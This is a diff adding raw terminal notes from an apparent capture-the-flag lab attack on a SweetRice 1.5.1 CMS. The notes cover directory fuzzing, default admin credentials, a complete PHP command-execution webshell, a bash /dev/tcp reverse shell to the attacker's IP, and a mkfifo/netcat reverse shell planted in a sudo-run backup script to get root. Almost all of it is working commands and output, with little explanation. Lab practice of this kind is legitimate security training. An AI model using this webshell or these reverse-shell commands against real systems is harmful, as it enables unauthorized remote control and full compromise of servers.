@@ -1,0 +1,189 @@
+
+
+
+
+
+
+
+
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# searchsploit sweetrice               
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+SweetRice 0.5.3 - Remote File Inclusion                                            | php/webapps/10246.txt
+SweetRice 0.6.7 - Multiple Vulnerabilities                                         | php/webapps/15413.txt
+SweetRice 1.5.1 - Arbitrary File Download                                          | php/webapps/40698.py
+SweetRice 1.5.1 - Arbitrary File Upload                                            | php/webapps/40716.py
+SweetRice 1.5.1 - Backup Disclosure                                                | php/webapps/40718.txt
+SweetRice 1.5.1 - Cross-Site Request Forgery                                       | php/webapps/40692.html
+SweetRice 1.5.1 - Cross-Site Request Forgery / PHP Code Execution                  | php/webapps/40700.html
+SweetRice < 0.6.4 - 'FCKeditor' Arbitrary File Upload                              | php/webapps/14184.txt
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 http://10.201.81.123/FUZZ/
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.201.81.123/FUZZ/
+Total requests: 62281
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000081:   200        35 L     151 W      2199 Ch     "content" 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 http://10.201.81.123/content/FUZZ/
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.201.81.123/content/FUZZ/
+Total requests: 29999
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000009:   200        20 L     103 W      1777 Ch     "js"                                                
+000000002:   200        28 L     174 W      3444 Ch     "images"                                            
+000000057:   200        44 L     352 W      6685 Ch     "inc"                                               
+000000301:   200        16 L     60 W       964 Ch      "_themes"                                           
+000000643:   200        15 L     49 W       774 Ch      "attachment"                                        
+000001710:   200        113 L    252 W      3669 Ch     "as"                                                
+
+Total time: 0
+Processed Requests: 29986
+Filtered Requests: 29980
+Requests/sec.: 0
+
+
+http://10.201.81.123/content/inc/lastest.txt
+version 1.5.1
+
+http://10.201.81.123/content/as/
+shows us a login page
+
+
+default creds
+manager:Password123
+
+
+Database Setting
+
+    Database : mysql
+    Database Host : localhost
+    Database Port : 3306
+    Database Account : rice
+    Database Password : randompass
+
+
+uploading plugin not working. 
+
+upload webshell through the media center
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat prettywebshell.php
+<?php
+echo "<!DOCTYPE html>
+<html>
+<head>
+<title>PHP Webshell</title>
+<style>
+body { background: #222; color: #eee; font-family: monospace; }
+input,button { background: #333; color: #eee; border: 1px solid #444; padding: 5px; }
+pre { background: #111; color: #0f0; padding: 10px; border-radius: 5px; }
+</style>
+</head>
+<body>
+<h2>PHP Webshell</h2>
+<form method='POST'>
+<input type='text' name='cmd' style='width:60%' autofocus placeholder='Command'>
+<button type='submit'>Run</button>
+</form>";
+if (isset($_POST['cmd'])) {
+    echo '<pre>';
+    system($_POST['cmd']);
+    echo '</pre>';
+}
+echo '</body></html>';
+?>
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nano prettywebshell.php               
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# zip -r prettywebshell.zip prettywebshell.php 
+  adding: prettywebshell.php (deflated 40%)
+                                                    
+
+
+http://10.201.81.123/content/attachment/725f8f93539439a48d192e4a18debf40.php
+
+bash -c 'bash -i >& /dev/tcp/10.6.66.96/4444 0>&1'
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.81.123] 51142
+bash: cannot set terminal process group (1049): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@THM-Chal:/var/www/html/content/attachment$ 
+
+
+www-data@THM-Chal:/home$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+www-data@THM-Chal:/home$ 
+
+www-data@THM-Chal:/home/itguy$ cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+www-data@THM-Chal:/home/itguy$ 
+
+www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.66.96 4445 >/tmp/f
+www-data@THM-Chal:/home/itguy$ 
+
+www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
+rm: cannot remove '/tmp/f': No such file or directory
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4445                                                     
+listening on [any] 4445 ...
+connect to [10.6.66.96] from (UNKNOWN) [10.201.81.123] 37906
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# 
+
+
+
+
+
+
+
+
+
+
+
